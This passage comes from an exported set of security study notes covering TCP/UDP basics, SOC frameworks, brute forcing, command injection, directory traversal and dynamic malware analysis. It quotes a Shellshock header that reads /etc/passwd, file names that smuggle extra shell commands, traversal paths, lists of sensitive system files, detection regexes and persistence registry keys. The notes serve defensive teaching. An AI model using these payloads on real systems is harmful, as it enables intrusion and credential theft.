TCP/IP protocol suite can be described in terms of the OSI reference model. The key similarities are in the transport and network layers; however, the two models differ in how they relate to the layers above and below each layer."},"Networking/TCP":{"title":"TCP","links":["Networking/Transport-Layer-Protocol","Networking/UDP"],"tags":[],"content":"Transmission Control Protocol (TCP) is a Transport Layer Protocol that is widely used to ensure reliable and ordered delivery of data over a network. Unlike UDP, TCP is a connection-oriented protocol that establishes a connection between the sender and receiver before data transmission.\nKey Features\n\nReliable Data Transfer: TCP ensures that all packets are delivered and in the correct order by using acknowledgments and retransmissions.\nConnection-Oriented: A connection is established and maintained until the data transfer is complete, ensuring that data is transmitted between the correct endpoints.\nFlow Control: TCP uses flow control mechanisms to prevent network congestion by adjusting the rate of data transmission based on the receiver’s ability to process data.\nError Detection and Correction: TCP includes mechanisms for error checking and correction to ensure data integrity.\nThree-Way Handshake: Connections are established using a three-way handshake (SYN, SYN-ACK, ACK) to synchronize the sender and receiver.\n\nApplications like web browsing, email, and file transfers use TCP because they require reliable and ordered delivery of data."},"Networking/Transport-Layer-Protocol":{"title":"Transport Layer Protocol","links":["Networking/OSI-Model","Networking/TCP-IP-Model","Networking/UDP","Networking/TCP"],"tags":[],"content":"Transport Layer is the 4th Layer of OSI Model and 3rd Layer of TCP IP Model. It is responsible for ensuring packets are sent reliably and any missing packets are resent.\nSome of the protocols in this layer are:\n1. UDP Protocol\n2. TCP Protocol"},"Networking/UDP":{"title":"UDP","links":["Networking/Transport-Layer-Protocol","Networking/TCP"],"tags":[],"content":"User Datagram Protocol (UDP) is a Transport Layer Protocol which is used transferring data over networks.\nUDP packets each have their own header and payload. The header contains information essential for routing and delivery, including source and destination ports, length, and a checksum.\nUnlike TCP, UDP does not establish a connection before transferring data and does not guarantee reliable delivery, order, or data integrity. This makes UDP faster and more efficient for applications that can tolerate packet loss, such as live broadcasts and online gaming."},"Networking/URI,-URN-and-URL":{"title":"URI, URN and URL","links":["HTB/FTP","HTB/ssh","tags/page155"],"tags":["page155"],"content":"Web resources and web services such as RESTful APIs are identified using a Uniform Resource Identifier (URI). A URI is a string of characters that identifies a specific network resource. As shown in the figure, a URI has two specializations:\n\nUniform Resource Name (URN) - This identifies only the namespace of the resource (web page, document, image, etc.) without reference to the protocol.\nUniform Resource Locator (URL) - This defines the network location of a specific resource on the network. HTTP or HTTPS URLs are typically used with web browsers. Other protocols such as FTP, SFTP, ssh, and others can be used as a URL. A URL using SFTP might look like: sftp://sftp.example.com.\n\nParts of URI\nThese are the parts of a URI, as shown in the figure:\n\nProtocol/scheme - HTTPS or other protocols such as FTP, SFTP, mailto, and NNTP\nHostname - w​ww.example.com\nPath and file name - /author/book.html\nFragment - page155\n\n"},"SOC/!!-SOC-Learning-Pathway-!!":{"title":"!! SOC Learning Pathway !!","links":["SOC/SOC","SOC/Pyramid-of-Pain","SOC/Cyber-Kill-Chain","SOC/Unified-Kill-Chain","SOC/MITRE-ATT-and-CK-Framework","SOC/Phishing","SOC/Web-Attacks","SOC/Malware-Analysis"],"tags":[],"content":"1. SOC\n2. Pyramid of Pain\n3. Cyber Kill Chain\n4. Unified Kill Chain\n5. MITRE ATT&amp;CK Framework\n6. Phishing\n7. Web Attacks\n8. Malware Analysis"},"SOC/29-Malware-analysis-adresses":{"title":"29 Malware analysis adresses","links":[],"tags":[],"content":"\nAnlyz\nAny.run\nComodo Valkyrie\nCuckoo\nHybrid Analysis\nIntezer Analyze\nSecondWrite Malware Deepview\nJevereg\nIObit Cloud\nBinaryGuard\nBitBlaze\nSandDroid\nJoe Sandbox\nAMAaaS\nIRIS-H\nGatewatcher Intelligence\nHatching Triage \nInQuest Labs\nManalyzer\nSandBlast Analysis\nSNDBOX\nfirmware\nopswat\nvirusade\nvirustotal\nmalware config\nmalware hunter team\nvirscan \njotti\n"},"SOC/APT-Groups":{"title":"APT Groups","links":[],"tags":[],"content":"Advanced Persistent Threat (APT) Groups, are the hacker groups that may include many different people and groups that carry out cyber attacks in a targeted and systematic way, with governments support from time to time.\nWithin the MITRE ATT&amp;CK Framework, information about APT groups is collected which helps identify which APT group is targeting which systems and which cyber attack techniques are being implemented. When all this information is gathered together and evaluated with the MITRE ATT&amp;CK matrix, the attack map of the APT group can be revealed.\nGroups: 135\nGroups: attack.mitre.org/groups/ \nExample: Lazarus Group\nThe information about the “Lazarus Group” APT group is as follows:\n\nAs seen in the image above, each APT group listed in the MITRE ATT&amp;CK Framework has a unique Group ID, Name and Description.\nYou can also see the information about the techniques used by the group in cyber attacks at the bottom of the page:\n\nUnder the “Techniques” column, you can see what tools, software or techniques that the APT group was leveraged for the attack. e.g., some software used by the “Lazarus Group” APT group is as in the image below:\n"},"SOC/Adversary's-Objectives":{"title":"Adversary's Objectives","links":["SOC/Unified-Kill-Chain","SOC/C2"],"tags":[],"content":"The ultimate goal of adversary usually boils down to one pr multiple of the three:\n\nsteal data\ndestroy the organization\nmake an impact\n\nThe Unified Kill Chain describes these motives in three steps:\nCollection\nMITRE Tactic (TA0009)\nAfter all the hunting for access and assets, the adversary will be seeking to gather all the valuable data of interest. This, in turn, compromises the confidentiality of the data and would lead to the next attack stage – Exfiltration. The main target sources include drives, browsers, audio, video and email.\nExfiltration\n(MITRE Tactic TA0010)\nTo elevate their compromise, the adversary would seek to steal data, which would be packaged using encryption measures and compression to avoid any detection. The C2 channel and tunnel deployed in the earlier phases will come in handy during this process.\nImpact\n(MITRE Tactic TA0040)\nIf the adversary seeks to compromise the integrity and availability of the data assets, they would manipulate, interrupt or destroy these assets. The goal would be to disrupt business and operational processes and may involve removing account access, disk wipes, and data encryption such as ransomware, defacement and denial of service (DoS) attacks.\nThe adversary may also wipe out the victim system in this stage to remove any traces of him."},"SOC/Backdoor":{"title":"Backdoor","links":["SOC/Pyramid-of-Pain","HTB/Remote-Shells","HTB/Services"],"tags":[],"content":"Maintaining access is important for adversaries, but it is very difficult. The longer a system has been compromised, greater are the risks of detection, and once detected the vulnerabilities will be patched and the cycle of pain continues. To break this cycle, adversaries usually set up a way to still remain in control even after the vulnerability is patched. This is what we call a backdoor, an alternate way in.\nTo achieve this, adversaries modify system settings or applications to receive malicious requests and execute them. There are number of backdoors a adversary can install on a system such as\n\nRemote Shells\nModified Windows Services\n"},"SOC/Brute-Force-Attack":{"title":"Brute Force Attack","links":["web-attacks"],"tags":[],"content":"What is Brute Forcing?\nBrute forcing is a type of attack that involves attempting to guess a password or authentication token by systematically trying every possible combination of characters until the correct one is found. In the context of web attacks, brute forcing typically refers to the process of using automated tools to repeatedly submit login requests to a web application using different username and password combinations until a valid one is discovered.\nBrute force attacks can be used to gain unauthorized access to a system, steal sensitive information, or launch further attacks against the target or other systems. They can be particularly effective against weak or poorly protected passwords, but can also be very time-consuming and resource-intensive for the attacker, especially if the target system has implemented measures to detect and block brute force attacks.\nBrute force attacks are one of the simplest and most straightforward methods of attacking a web application, and it works by systematically trying every possible combination of usernames and passwords until the correct one is found. This process is typically automated using specialized software or scripts, which can try thousands or even millions of combinations per second.\nThe basic idea behind a brute force attack is to exploit the weak or easily guessable passwords that a lot of people use especially the non-techy users, such as common dictionary words, simple number sequences, or their own names or birthdates. By systematically trying every possible combination of characters, attackers can eventually find the correct password and gain access to the target system.\nBrute Forcing Possible Vectors\nBrute forcing on web applications is a common attack vector used by hackers to gain unauthorized access to user accounts or web servers. In this type of attack, the attacker will use automated tools to submit multiple login requests to the targeted web application using different usernames and passwords, in an attempt to find the correct credentials and gain access to the system.\nWeb applications are particularly vulnerable to brute force attacks because they are often accessible over the internet and rely on user authentication to control access to sensitive data or functionality. If an attacker is able to guess a valid username and password, they can potentially gain access to sensitive user data, such as financial information, personal data, or confidential business information. \nActually, it’s not just guessing usernames and passwords also, directory brute forcing on web applications is another type of brute force attack that involves guessing file or directory names on a web server in order to find hidden or sensitive files or directories. In this type of attack, the attacker will use automated tools to submit requests to the targeted web server using different file or directory names, in an attempt to find files or directories that are not meant to be publicly accessible.\nThis type of attack can be effective against web applications that do not implement proper access controls or that have poorly configured web servers. To prevent directory brute force attacks, web application developers can implement access controls to restrict access to sensitive files and directories, and can configure their web servers to block requests for known sensitive files and directories.\nHow Brute Forcing Works?\nHere’s an example of vulnerable code that is susceptible to Brute Forcing attacks in a PHP script:\n\nThis form is vulnerable to brute force attacks because it allows unlimited login attempts and does not implement any security measures to prevent automated login attempts.\nHere’s an example of how you can use Python requests library to send multiple login requests with a list of usernames and passwords:\n\nImpact of Brute Forcing\nBrute forcing can have significant impacts on a target system or application. Here are some of the potential impacts of brute forcing:\n\n\nDenial of service: Brute forcing can consume a significant amount of computing resources, such as CPU cycles and memory, which can lead to system slowdowns or crashes. This can cause a denial of service (DoS) attack, which makes the target system unavailable to legitimate users.\n\n\nData leakage: Successful brute force attacks can allow unauthorized access to sensitive data, such as login credentials, personal information, financial data, and intellectual property. This can lead to data breaches, which can have severe consequences for the target organization, including financial losses and damage to reputation.\n\n\nAccount takeover: Brute forcing can allow attackers to gain access to user accounts without the owner’s consent. Once an attacker has access to an account, they can carry out malicious activities, such as stealing data, sending spam, or carrying out further attacks.\n\n\nPassword reuse: Brute forcing can reveal weak or easily guessable passwords, which can encourage users to reuse passwords across multiple accounts. This can increase the risk of compromise, as a successful brute force attack on one account can provide access to multiple accounts.\n\n\nLegal and reputational consequences: Brute forcing is illegal and unethical, and can result in significant legal and reputational consequences for individuals and organizations who engage in it. If caught, attackers can face criminal charges, fines, and other penalties. Additionally, organizations who are victims of brute force attacks may suffer reputational damage, loss of trust from customers and stakeholders, and legal liability for failing to protect their systems and data.\n\n\nPrevention Methods for Brute Forcing\nImplement account lockout policies: After a certain number of failed login attempts, lock the user account for a specified period of time, to prevent further login attempts. This will make brute force attacks more difficult, as the attacker will need to wait for the account to become unlocked before attempting more login attempts.\nImplement CAPTCHA: Use CAPTCHA or other bot detection mechanisms to detect automated login attempts and prevent them from succeeding.\nLimit the rate of login attempts: Implement a mechanism that limits the number of login attempts that can be made within a certain time period (e.g. 5 login attempts per minute). This will slow down brute force attacks, as the attacker will need to wait between attempts.\nUse multi-factor authentication: Require users to provide additional authentication factors, such as a one-time code sent via SMS or email, in addition to their username and password.\nMonitoring login attempts: This involves monitoring login attempts for signs of suspicious activity, such as multiple failed login attempts from the same IP address, or unusual spikes in traffic or requests. This can help to detect and prevent brute force attacks before they are successful.\nUsing strong passwords and password policies: This involves requiring users to choose strong passwords that are difficult to guess, and enforcing password policies that require users to change their passwords regularly and prohibiting the use of weak or easily guessable passwords.\nWeb Application Firewalls (WAFs) are commonly used to protect web applications from various types of attacks, including brute force attacks. Here are some ways WAFs can prevent brute force attacks; \nIP blocking: WAFs can block access to the web application from IP addresses that have made excessive login attempts or have triggered other security rules. This can prevent brute force attacks by blocking the attacker’s access to the application altogether.\nUser behavior analysis: WAFs can analyze user behavior patterns to detect abnormal activity, such as a high rate of login attempts or unusual login times. This can help prevent brute force attacks by detecting and blocking suspicious behavior before it becomes a problem.\nIt’s important to note that WAFs are not foolproof and can be bypassed by skilled attackers. Therefore, it’s important to implement multiple layers of security controls, such as strong passwords, account lockout policies, and security awareness trainings for users, in addition to using  WAFs.\nBy implementing these measures, the login form can be more secure, robust, and resistant to brute-force attacks.\nDetecting Brute Forcing Attacks\nIn Part 1, we have described what the Brute Forcing is and how to prevent this attack type. In this part, we’ll have a look at the detection techniques and some tips to make it easier to detect and prevent brute force attacks.\nAnalyzing brute force attacks can help you understand the methods used by attackers and identify vulnerabilities in your security controls. To do this, you should collect and store authentication logs from your web application, including the successful logins as well as the failed login attempts. Look for patterns of suspicious activity in the authentication logs, such as a high number of failed login attempts from a particular IP address or user account. Analyze network traffic logs to identify patterns of traffic that may be associated with brute force attacks, such as repeated login attempts from the same IP address or requests to non-existent pages or directories. \nDeploy an intrusion detection system (IDS) or intrusion prevention system (IPS) to analyze network traffic and detect signs of brute force attacks. Look for common attack vectors used in brute force attacks, such as dictionary attacks or password spraying. Identify user accounts that are vulnerable to brute force attacks due to weak passwords or other vulnerabilities. Finally, monitor for incidents of brute force attacks and respond to them promptly by blocking malicious IP addresses, locking out user accounts, and implementing additional security controls as necessary. By following these steps, you can strengthen your security controls and reduce the risk of successful brute force attacks.\nExample Nginx log file that contains Brute Force attack;\n\nThe log file provided shows the unsuccessful login attempts only. In order to detect the successful login attempts, you would need to analyze the logs further or modify your logging configuration to include the successful login attempts as well.\nSuccessful login attempts would typically result in a response code of 200 or a redirect to a different page, which can be identified in the log file. However, keep in mind that some attackers may attempt to obfuscate their successful login attempts by logging in with valid credentials or using a compromised account, so it is important to perform further analysis to determine if any suspicious activity is occurring.\n\nIn this example, the log entry shows a POST request to the /login.php page with a response code of 302, which indicates a successful login attempt. The Cookie header also includes a PHPSESSID value and a login value, which may be used to track the user session and authentication status. Note that the exact format and contents of the log files can vary depending on the web server and its configuration.\nTo detect brute force attacks in nginx log files, you can use various tools and techniques such as:\nLog analysis tools: There are several log analysis tools such as Logstash, ElasticSearch, and Kibana (ELK Stack) that can help you analyze nginx log files and detect brute force attacks. These tools will allow you to search for specific patterns in the log files, such as repeated failed login attempts from the same IP address or user agent.\nRegular expressions: Regular expressions can be used to search for specific patterns in the log files. For example, you can use a regular expression to match a sequence of repeated failed login attempts from the same IP address or user agent.\nThings that you can do after the detection:\nFail2ban: Fail2ban is a popular intrusion prevention tool that can be used to automatically block the IP addresses that are detected as engaging in brute force attacks. Fail2ban works by monitoring the nginx log files and applying predefined filters to detect and block suspicious activity.\nIP blocking: You can manually block IP addresses that are detected as engaging in brute force attacks by adding them to the nginx configuration file. For example, you can use the deny rule to block traffic from specific IP addresses:\n\nIt’s important to note that detecting brute force attacks is not always a straightforward process and may require additional analysis and investigation to identify the suspicious activity accurately.\nHere’s an example of a regular expression that can be used to detect repeated failed login attempts from the same IP address in an nginx log file:\n/^(\\S+) \\S+ \\S+ [.?] “(POST|GET) /login.php.” (401|403) \\d+ ”.?” ”.?”/gm\nThis regular expression will match any log file entry that includes a failed login attempt (401 or 403 status code) to the /login.php page. It will capture the IP address of the client making the request in the first capture group ((\\S+)). You can then use a log analysis tool or script to count the number of times each IP address appears in the log file and flag any IP addresses that have a high number of failed login attempts as potential brute force attackers. Also, you can update the regex’s IP address as suspicious IP source.\nIn this lesson, we have covered the Brute Forcing attack. We have talked about how the vulnerability appears, as well as the detection and the prevention methods."},"SOC/C2":{"title":"C2","links":["HTB/Reverse-Shell","Networking/DNS"],"tags":[],"content":"Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a Reverse Shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.\nCommon C2 Channels\n1. HTTP/HTTPS\nThe protocols HTTP on port 80 and HTTPS on port 443 - this type of beaconing blends the malicious traffic with the legitimate traffic and can help the attacker evade firewalls.  \n2. DNS\nThe infected machine makes constant DNS requests to the DNS server that belongs to an attacker, this type of C2 communication is also known as DNS Tunneling.\nImportant to note that an adversary or another compromised host can be the owner of the C2 infrastructure."},"SOC/Command-Injection":{"title":"Command Injection","links":[],"tags":[],"content":"What are Command Injection Attacks?\nCommand injection attacks are attacks that occur when data received from a user is not sanitized and is passed directly to the operating system shell.\n\nAttackers exploit command injection vulnerabilities to execute commands directly on the operating system. Since the attacker’s priority is to take control of the system, these vulnerabilities are more critical than other vulnerabilities.\nA misconfigured web application would grant the attacker access with admin rights because the command the attacker sends uses the rights of the web application user.\nHow does Command Injection work?\nCommand injection vulnerabilities occur when the data received from the user is not sanitized. Let’s examine command injection vulnerabilities with an example.\nSuppose we have a basic web application that copies the user’s file to the “/tmp” folder. The web application code is shown below:\n\nUnder normal circumstances, if used correctly, the application will work normally. For example, if we upload a file called “letsdefend.txt”, it will successfully copy the file to the “/tmp” folder.\nSo what if we upload a file called “letsdefend;ls;.txt”? The command would be:\nCommand: cp letsdefend;ls;.txt\nThe ”;” indicates that the command has ended. So if we look at the payload above, there are three different commands that the operating system executes. These are:\n\ncp letsdefend\nls\n.txt\n\n\nThe first command is for the copying process, but if the parameters are not entered correctly it will not work correctly.\nCommand #2 is the directory listing command that the attacker wants to execute. The user does not receive the command output, so the attacker cannot see the files in the directory, but the operating system successfully executes the command.\nIf the operating system tries to run command number 3, it will get an error message because there is no “.txt” command.\nAs you can see, the code has been executed in the web server’s operating system. So what if the attacker were to upload a file called “letsdefend;shutdown;.txt”? The operating system would shut down and the web application would not be able to function.\nWith the correct payload, the attacker can create a reverse shell in the operating system.\nHow attackers can exploit Command Injection Attacks\nAttackers can execute commands on an operating system by exploiting command injection vulnerabilities. This means that the web application and all other components on the server are at risk.\nHow to Prevent Command Injection\n\nAlways sanitize data you receive from a user: Never trust anything you receive from a user. Not even a file name!\nLimit user privileges: Whenever possible, set web application user rights at a lower level. Few web applications require users to have administrator rights. \nUse virtualization technologies such as dockers.\n\nDetecting Command Injection Attacks\nSo how do we detect command injection attacks?\nActually, there is more than one way. These are:\n\nWhen examining a web request, look at all areas: The command injection vulnerability may be in different areas depending on how the web application works. Therefore, you should check all areas of the web request.\nLook for keywords related to the terminal language: Check the data received from the user for keywords related to terminal commands such as dir, ls, cp, cat, type, etc.\nLearn about commonly used command injection payloads: When attackers discover a command injection vulnerability, they usually create a reverse shell to make their work easier. Therefore, knowing commonly used command injection payloads will make it easier to detect a command injection attack.\n\nA Detection Example\nIn this example, we will not be looking at access logs, but instead at an HTTP request.\n\nGET / HTTP/1.1\nHost: yourcompany.com\nUser-Agent: () { :;}; echo “NS:” $(&lt;/etc/passwd)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\nLooking at the HTTP request above, we can see that the main page of the web application yourcompany[.]com was requested.\nBut if we look at the HTTP request headers, we see a suspicious situation in the User-Agent header. There is a bash command in the User-Agent header where there should be browser/operating system information.\nIn fact, this request was captured while a security vulnerability called Shellshock was being exploited. Shellshock is a security vulnerability that was disclosed in 2014 and had a major impact.\nShellshock comes from bash somehow executing environment variables unintentionally. It is a great example of a command injection attack.\nThe contents of the file “/etc/passwd” are returned to the attacker as “NS” in the HTTP response header when the bash command, which is in the user agent, is executed."},"SOC/Cyber-Kill-Chain":{"title":"Cyber Kill Chain","links":["SOC/Reconnaissance","SOC/Phishing","SOC/Watering-Hole","Zero-day","SOC/Backdoor","HTB/Web-Shell","web-shell","HTB/Services","SOC/Timestomping","SOC/Masquerading","SOC/SOC","SOC/C2","SOC/Unified-Kill-Chain"],"tags":[],"content":"The Cyber Kill Chain framework is designed for identification and prevention of the network intrusions. The term kill chain is used in military to refer to the steps taken by an adversary to reach its ultimate goal.\nA typical cyber kill chain looks like:\nThe Cyber Kill Chain\n1. Reconnaissance\nReconnaissance is the first step and it provides adversary with all the info needed for getting into a system.\n\n2. Weaponization\nIn this step, the threat actor combines malware and exploit into a deliverable payload. Most attackers usually use automated tools to generate the malware or refer to the Dark Web to purchase the malware.\n\n3. Delivery\nThe delivery of the Weapon can be performed through plenty of ways:\n1. Phishing emails\n2. Delivering malicious urls\n3. Watering Hole attack\n\n4. Exploitation\nExploitation is the step in which the payload is run in the victim system and vulnerabilities are exploited. The malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network.\nSome examples of exploitation are:\n1. Zero day exploit\n2. Exploit software, hardware or even human exploit\n3. Server based exploit\n\n5. Installation\nOnce the system is exploited, the attacker will install a persistent Backdoor in the system. This persistence can be achieved through various methods:\n1. Installing a Web Shell\nA web shell, because of its simplicity, can be well hidden and difficult to get rid of. Hence, it serves as an excellent Backdoor for an attacker.\n2. Windows Services\nWindows service run in background and can be modified to execute a malicious script or payloads. Adversary may create, or modify a windows service to execute payloads under a service name related to the OS or legitimate software.\n3. Run keys\nAdding the entry to the “run keys” for the malicious payload in the Registry or the Startup Folder. By doing that, the payload will execute each time the user logs in on the computer.\n4. Installing a Backdoor\nAdversary may install other backdoors such as Meterpreter’s Backdoor, to later gain access to the system.\nIn this phase, the attacker can also use the Timestomping and Masquerading techniques to avoid detection by the forensic investigator and hide the malware.\nThe defenders\nThe fact that an attacker who reached this stage is performing malicious activities on the systems indicates that the attacker cannot be detected. Therefore, whether the attacker is present or not, the SOC team should manage and execute security operations under the assumption that there is always an attacker present in the system.\n\n6. Command and Control (C2)\nNow the system has been compromised and a Backdoor has been installed. But the attacker stills needs a way to communicate with the compromised system and that also without being detected. Here comes the role of C2 Server. With C2 server the attacker can easily control the host.\n\n7. Exfiltration\nNow the adversary finally execute their objective which may be stealing data, destroying data, continuing lateral movement, etc.\n\nNext: Unified Kill Chain"},"SOC/Directory-Traversal-Attack":{"title":"Directory Traversal Attack","links":[],"tags":[],"content":"What is Directory Traversal?\nDirectory traversal is an attack type that the attackers leverage often to access files and directories that are stored outside the web server’s root directory. It involves manipulating input to be able to access files on a web server that are actually not intended to be accessible by unauthorized users. This type of attack is also known as the “dot-dot-slash” attack, and it can be used to gain unauthorized access to sensitive data or execute arbitrary code on a web server.\nFor example, let’s say a web application uses the following URL to display user profile pictures:\nexample.com/profiles/picture.php\nAn attacker can leverage directory traversal attack to access files outside of the intended directory by adding ../ to the URL. For instance, they could use the following URL to access a file outside of the profiles directory: example.com/profiles/picture.php\nThis would give the attacker access to sensitive system files, such as the password file.\nActually, at first look, it’s pretty similar to a Local File Inclusion vulnerability. The main difference between the directory traversal and LFI is the source of the input. Directory traversal involves in manipulating the input that is used to access files on a web server, whereas LFI involves in manipulating input that is used to include local files within a web application.\nIn a local file inclusion vulnerability, an attacker can use user input to include a file from the local file system into the web application. This can allow the attacker to execute arbitrary code on the server to access the sensitive data.\nFor example, consider a web application that includes a file based on user input, such as include($_GET[‘page’]). An attacker could manipulate the page parameter to include a sensitive file on the server, such as ../../../../etc/passwd. This would allow the attacker to read the password file and gain unauthorized access to the system.\nIn contrast, directory traversal vulnerabilities allow attackers to access files outside of the web application’s root directory. This can also allow them to execute arbitrary code or access sensitive data, but the attack vector is different.\nDirectory Traversal Possible Vectors\nDirectory traversal attacks can occur through various attack vectors, including:\n\nUser input: Attackers can manipulate user input parameters, such as URLs, file paths, and form fields, to access files outside of the intended directory. This can be done by adding “../” or other special characters to the input.\nCookies: If a web application stores user data in cookies, attackers can try to manipulate the cookie value to access files outside of the intended directory.\nHTTP headers: Attackers can manipulate HTTP headers, such as the Referer or User-Agent header, to access files outside of the intended directory.\nFile upload: If a web application allows file uploads, attackers can upload malicious files that contain directory traversal attacks.\nDirect requests: Attackers can try to access files and directories directly by guessing or brute-forcing the file names or paths.\nURL manipulation: Attackers can try to manipulate the URL of a web application to access files outside of the intended directory. For example, they can add ”/../” to the URL to go up one directory level.\nMalicious links: Attackers can send users malicious links that contain directory traversal attacks. When the user clicks on the link, the attack is executed on their computer.\n\nHow Directory Traversal Works?\nHere’s an example of vulnerable code that is susceptible to directory traversal attacks in a PHP script:\n\nIn this example, the script takes a file name as a parameter from the user input using the $_GET method. The script then concatenates the user input with the document root directory to form a full path to the file.\nHowever, this code is vulnerable to directory traversal attacks since an attacker can manipulate the file parameter to include ../ characters, which will allow them to access files outside of the intended directory. For example, an attacker could use the following URL to access the /etc/passwd file on the server:\n\nImpact of Directory Traversal\nThe impact of a directory traversal attack can be severe, depending on the files and directories that the attacker can access.\nAttackers who successfully exploits a directory traversal vulnerability can view, modify, or delete files that they are not authorized to access. This can lead to a variety of security risks and attacks, including:\n\nDisclosure of sensitive data: An attacker can access sensitive files, such as password files, configuration files, and user data, which can be used for identity theft, fraud, or other malicious activities.\nExecution of arbitrary code: An attacker can upload and execute malicious files that contain commands or code that can harm the system, such as malware or backdoors.\nDenial of service: An attacker can delete critical files or cause a system to crash, resulting in a denial of service attack.\nSystem compromise: An attacker who gains access to system files or directories can use\n\nPrevention Methods for Directory Traversal Attacks\nHere are some best practices to prevent directory traversal attacks in web applications:\n\n\nInput validation and sanitization: Validate and sanitize all user input, especially the file paths and the directory names. This can involve using regular expressions or other methods to check the input for valid characters, and to limit the input to known values or directories.\n\n\nAccess controls: Limit the web server’s access to only the files and directories required for the application to function. Use file the system permissions and access controls to restrict access to sensitive files and directories.\n\n\nRelative file paths: Use relative file paths instead of absolute paths whenever possible. This can prevent attackers from using the “../” character to navigate up to higher-level directories.\n\n\nWhitelisting: Use a whitelist approach where only specific characters are allowed in the file name parameter. This can be done using a validation library or a custom validation function.\n\n\nSecure coding practices: Use secure coding practices, such as avoiding the use of user input directly in file path concatenation, using secure file upload mechanisms, and avoiding the use of insecure functions like eval() and system().\n\n\nWeb application firewall: Use a web application firewall (WAF) to detect and block directory traversal attacks. WAFs can analyze incoming traffic for malicious requests and prevent attacks from reaching the web application.\n\n\nBy following these best practices, web application developers and administrators can reduce the risk of directory traversal attacks and protect their web applications and systems from unauthorized access and data breaches.\nHere’s an example of vulnerable PHP code that is susceptible to directory traversal attacks:\n\nIn this code, the file variable is set to the value of the file parameter from the user’s input. The script then concatenates this value with the document root directory to form a full file path in the $full_path variable. This code is vulnerable to directory traversal attacks because an attacker can include directory traversal sequences like ../ in the file parameter to access files outside of the intended directory.\nHere’s an updated version of the code that uses input validation and sanitization to prevent directory traversal attacks:\n\nIn this updated version of the code, we first validate the input using a regular expression to ensure that the file name only contains alphanumeric characters, underscores, and hyphens. We then use the realpath() function to get the absolute path of the file and check that the resulting path is within the document root directory. This prevents the use of directory traversal sequences like ../ to access files outside of the intended directory. If the file exists, we read and output its contents; otherwise, we output an error message.\nDetecting Directory Traversal Attacks\nIn Part 1, we have overviewed what the directory traversal attack is and how to prevent this attack type. In this part, we’ll have a look at detection techniques and some tips to make it easier. Before the moving on, let’s have a quick look for example payloads for the directory traversal vulnerability;\n\nThese are really basic payloads for directory traversal attacks. So, we should keep in mind ../ (dot dot slash), encoded and double encoded ../ is the key values for this attack type. Here is the basic example for detecting these payloads on nginx access.log file;\n/^.”GET.?.=(%2e%2e%2f).+?.HTTP/.“.$/gm\n\nAs a bypass technique, attackers may also use unicode encode characters to bypass WAF or any other product.\n\nIn that case, Nginx access log will be like;\n\nThese are detection payloads for the Directory Traversal attack. For a successful exploit, attacker needs to access some files. most popular ones are;\nLinux\n\n/etc/issue\n/etc/passwd\n/etc/shadow\n/etc/group\n/etc/hosts\n\nWindows\n\nc:/boot.ini\nc:/inetpub/logs/logfiles\nc:/inetpub/wwwroot/global.asa\nc:/inetpub/wwwroot/index.asp\nc:/inetpub/wwwroot/web.config\nc:/sysprep.inf\n\n\nBasic regex that we have shared above will work with these logs but to prevent False Positive alarms it can be updated more strictly like;\n/^.”GET.?.=(.+?(?=%2e%2e%2fetc%2f)).+?.HTTP/.“.$/gm"},"SOC/Dynamic-Analysis-Steps":{"title":"Dynamic Analysis Steps","links":[],"tags":[],"content":"Process Activities\nWhen the malware is run, it creates a process of its own like other applications. All operations on the operating system are carried out through a process. Before following other activities, we must detect the processes belonging to the malware.\nA large number of process, network, registry and file activities take place within the operating system. Since it may not be possible to analyze all these activities, we can start analyzing the activities of the malware processes to see if we can find anything solid about its activities.\nWhen examining a process, special attention should be paid to information such as whether it creates a new child process, the DLLs it imports, and which user it is run by.\nYou can use an application called Process Hacker to examine processes.\n\nProcess Hacker makes it easy to examine processes by listing processes in a hierarchical view. When the malware creates a new process, you can see the newly created process under its parent process.\nMalware can inject itself into different processes, perform activities for its own purposes with living of the land binaries, or make legitimate applications run their own applications. For these reasons, the activities of all processes belonging to the malware and used by the malware should be analyzed.\nFor instance, let’s say the malware injects itself into the notepad.exe process after it runs. In this case, we need to examine all of the activities that notepad.exe has created since the moment it was injected.\nTopics like Process Injection will be discussed in the malware analysis trainings.\nNetwork Activities\nMalware often establish a network connection to download the second payload, to communicate with command and control (c2), to jump to other devices in the network, to steal data.\nAt the end of our malware analysis we need to detect these network connections, learn how the malware communicates, and report these network activities.\nWireshark is a software that can meet all your needs for analyzing network activities. However, you may choose tools such as Fiddler, in cases where you know that the malware communicates especially over the HTTP protocol (Malware mostly communicates via protocols such as HTTP, SMTP).\nRegistry Activities\nWe mentioned Registries in the Windows tutorial. Quickly again, registries are hierarchical databases that are used for data storage in Windows operating systems. It is used by attackers for purposes such as stealing data and ensuring persistence.\nWindows keeps applications to run when the operating system is started in some registry keys. Attackers aim to ensure persistence by taking the advantage of this feature of the operating system, and adding their own malicious software to these registry keys.\nSome of these registry keys;\n\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n_HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n_HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nSince Registries are also used a lot by normal processes, you, specifically need to look at the registry changes made by malicious software processes.\nBy using the application called Regshot, you can detect the changes that the malware has made on the Registries.\n\nBefore executing the malware, you can run Regshot and click the “1st shot” button to let Regshot collect existing registries.\nThen, you should press the “2nd shot” button to get a new shot after running the malware and allowing some time to show activity. You can see the differences between these two shots of Regshot by pressing the “Compare” button.\n\nFile Activities\nMalware performs file activities on the operating system for many reasons. Recently, attackers have developed fileless malware to prevent detection.\nOn Windows, there is a directory called “Temp” where temporary files are located. Applications usually use this directory to host their volatile files. Malware often copies itself to the Temp directory. For this reason, you should pay special attention to the activities performed on this directory.\nYou can access this directory by pressing the “Win ​​+ R” key combination and typing the following command afterwards:\n\n%TEMP%\n\n\nIn order to ensure persistence, malware also copies itself to the Startup directory, which contains applications that will run automatically when the operating system starts. You should pay special attention to the activities performed in these directories.\nYou can access this directory by pressing the “Win ​​+ R” key combination and typing the following command afterwards:\n\nshell:startup\nshell:common 